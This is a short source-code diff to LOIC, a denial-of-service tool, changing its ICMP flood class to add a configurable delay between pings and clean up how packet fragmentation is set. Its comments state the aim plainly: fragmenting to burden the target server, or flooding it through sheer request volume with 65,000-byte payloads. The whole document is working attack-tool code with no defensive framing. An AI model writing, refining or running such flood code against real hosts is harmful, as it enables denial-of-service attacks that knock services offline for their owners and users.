@@ -544,8 +544,10 @@ namespace LOIC
         /// <summary>
         /// Create the ICMP object, because we need that, for reasons
         /// </summary>
-        public ICMP(string ip, int port, bool RandomMessage, int PingsPerThread)
+        public ICMP(string ip, int port, int delay, bool RandomMessage, int PingsPerThread)
         {
+            this.Delay = delay;
+
             this._ip = ip;
             this._port = port;
             this._PingsPerThread = PingsPerThread;
@@ -554,24 +556,18 @@ namespace LOIC
             this._BytesToSend = new byte[65000];
 
             this._opt = new PingOptions();
-            this._opt.DontFragment = false;
             this._opt.Ttl = 128;
-
-            _opt = new PingOptions();
 
             if (RandomMessage)
             {
                 //if we're sending messages, fragment as greater processing power needed on server to reconstruct
-                _opt.DontFragment = false;
+                this._opt.DontFragment = false;
             }
             else
             {
                 //not sending messages, don't fragment, ddos through straight volume of requests
-                _opt.DontFragment = true;
+                this._opt.DontFragment = true;
             }
-
-            //def ttl
-            _opt.Ttl = 128;
         }
 
         public override void Start()
@@ -632,6 +628,12 @@ namespace LOIC
                     catch { }
                     State = ReqState.Completed;
                 }
+
+                if (Delay > 0)
+                {
+                    System.Threading.Thread.Sleep(Delay);
+                }
+
                 State = ReqState.Ready;
             }
         }
